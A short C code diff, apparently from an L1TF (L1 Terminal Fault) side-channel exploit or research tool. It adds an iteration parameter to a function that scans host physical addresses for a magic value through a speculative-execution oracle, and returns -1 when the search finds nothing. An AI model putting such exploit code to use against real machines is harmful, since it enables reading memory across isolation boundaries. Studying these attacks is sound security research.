@@ -992,7 +992,7 @@ static int same_cacheline(pa_t a, pa_t b)
   return (a >> 6) == (b >> 6);
 }
 
-hpa_t l1tf_find_magic16(hpa_t base, uint16_t magic, hpa_t start, hpa_t end, int step)
+hpa_t l1tf_find_magic16(hpa_t base, uint16_t magic, hpa_t start, hpa_t end, int step, int iters)
 {
   const int verbose = 1;
   hpa_t pa;
@@ -1006,7 +1006,7 @@ hpa_t l1tf_find_magic16(hpa_t base, uint16_t magic, hpa_t start, hpa_t end, int 
         hs_pa = pa;
       }
 
-      int hits = l1tf_oracle16(magic, pa, 10000, NULL);
+      int hits = l1tf_oracle16(magic, pa, iters, NULL);
       if (hits) {
         if (verbose) printf("pa = %16lx  hits = %d\n", pa, hits);
         break;
@@ -1016,6 +1016,8 @@ hpa_t l1tf_find_magic16(hpa_t base, uint16_t magic, hpa_t start, hpa_t end, int 
       printf(" run = %d\n", run);
   }
   half_spectre_stop();
+  if (pa >= end)
+    pa = -1;
   return pa;
 }
 
